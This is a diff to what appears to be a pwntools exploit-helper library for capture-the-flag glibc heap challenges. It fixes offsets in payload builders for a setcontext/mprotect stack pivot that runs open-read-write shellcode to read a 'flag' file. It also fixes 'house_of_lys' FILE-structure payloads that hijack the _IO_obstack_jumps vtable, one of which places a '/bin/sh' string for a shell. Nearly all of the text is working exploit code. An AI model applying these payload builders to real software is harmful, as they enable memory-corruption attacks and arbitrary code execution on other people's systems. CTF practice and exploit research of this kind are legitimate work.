@@ -43,13 +43,14 @@ def stack_pivot_orw_by_shellcode(target_addr: int, file_name: bytes = b'flag'):
     heap_first = target_addr
     setcontext = pwnvar.pwnlibc.sym['setcontext'] + 61
     mprotect_addr = pwnvar.pwnlibc.sym['mprotect']
-    payload = p64(heap_first + 0x28) + p64(heap_first)
+    payload = p64(heap_first + 0x28) + p64(heap_first+0x28)
     payload = payload.ljust(0x20, b'\x00') + p64(setcontext)
     payload += asm(shellcode)
     payload = payload.ljust(0x68, b'\x00') + p64(heap_first & 0xfffffffffffff000)
     payload = payload.ljust(0x70, b'\x00') + p64(0x2000)
+    payload += p64(heap_first+0x28)*2
     payload = payload.ljust(0x88, b'\x00') + p64(7)
-    payload = payload.ljust(0xa0, b'\x00') + p64(heap_first)
+    payload = payload.ljust(0xa0, b'\x00') + p64(heap_first+0x78)
     payload = payload.ljust(0xa8, b'\x00') + p64(mprotect_addr)
     payload += file_name + b'\x00'
     return payload
@@ -115,7 +116,7 @@ def house_of_lys(target_addr: int):
             0x48: target_addr + 0xa0,
             0x50: 1,
             0xa0: 0x68732f6e69622f,
-            0xd8: get_IO_obstack_Jumps() + 0x20,
+            0xd8: get_IO_obstack_jumps() + 0x20,
             0xe0: target_addr
         },
         filler='\x00'
@@ -153,7 +154,7 @@ def house_of_lys_orw(target_addr: int, file_name: bytes = b'flag'):
             0x48: target_addr + 0xe8,
             0x50: 1,
             0xa0: file_name,
-            0xd8: get_IO_obstack_Jumps() + 0x20,
+            0xd8: get_IO_obstack_jumps() + 0x20,
             0xe0: target_addr,
             0xe8: {
                 0x0: gg3,
@@ -166,7 +167,8 @@ def house_of_lys_orw(target_addr: int, file_name: bytes = b'flag'):
     )
     return payload
 
-def get_IO_obstack_Jumps():
+
+def get_IO_obstack_jumps():
     for i in pwnvar.pwnlibc.sections:
         if i.name == "__libc_IO_vtables":
             mem = pwnvar.pwnlibc.mmap
